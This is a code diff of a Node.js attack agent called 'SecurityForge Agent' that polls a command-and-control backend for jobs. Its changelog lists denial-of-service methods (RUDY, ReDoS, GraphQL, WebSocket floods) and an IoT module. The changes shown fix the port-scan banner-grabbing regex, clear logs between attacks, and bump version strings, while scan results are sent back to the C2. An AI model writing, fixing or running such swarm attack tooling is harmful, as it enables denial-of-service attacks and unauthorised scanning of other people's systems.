@@ -1,7 +1,7 @@
 /**
- * SECURITYFORGE AGENT V25.0 (HYPERVISOR)
- * - V25.0: Fixed Crash (startTime Reference), IoT Banner Grabbing.
- * - V24.0: Ghost Writer.
+ * SECURITYFORGE AGENT V26.0 (FINAL POLISH)
+ * - V26.0: Fixed Regex Syntax Error, Job Memory Cleaning.
+ * - V25.0: IoT Banner Grabbing, Hypervisor.
  * - V23.0: Fatal Four (GraphQL, RUDY, ReDoS, WebSocket).
  * - V22.0: IoT Module.
  */
@@ -31,7 +31,7 @@ const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V25.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V26.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -69,7 +69,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V25.0 (HYPERVISOR). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V26.0 (FINAL POLISH). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -91,7 +91,8 @@ const startAttack = (job) => {
     if (activeJob) return;
     activeJob = job;
     const duration = (job.duration && job.duration > 0) ? job.duration : 30;
-    const startTime = Date.now(); // FIX: Defined HERE to prevent ReferenceError
+    const startTime = Date.now();
+    logBuffer = []; // CLEAR LOG BUFFER ON START
 
     console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
     logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
@@ -253,7 +254,7 @@ const startAttack = (job) => {
         for(let i=0; i<20; i++) scan(i);
     }
     else if (job.use_port_scan) {
-        // ... PORT SCAN (BANNER GRABBING V25) ...
+        // ... PORT SCAN (BANNER GRABBING V25 + REGEX FIX V26) ...
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
         if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
         
@@ -269,7 +270,8 @@ const startAttack = (job) => {
             socket.on('data', (data) => {
                 const s = data.toString();
                 const server = s.match(/Server: (.+)/i);
-                const title = s.match(/<title>(.+)</title>/i);
+                // FIXED REGEX SYNTAX ERROR HERE
+                const title = s.match(/<title>(.+)<\/title>/i);
                 const banner = server ? server[1] : (title ? title[1] : s.substring(0, 50).replace(/\r\n/g, ' '));
                 logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost} | Banner: ${banner.trim() || 'Unknown'}`);
                 socket.destroy();
@@ -346,7 +348,7 @@ const startAttack = (job) => {
 
             // Headers setup
             const headers = {
-                'User-Agent': 'SecurityForge/25', 
+                'User-Agent': 'SecurityForge/26', 
                 'Content-Type': 'application/json',
                 ...((typeof job.headers === 'string' ? {} : job.headers) || {})
             };
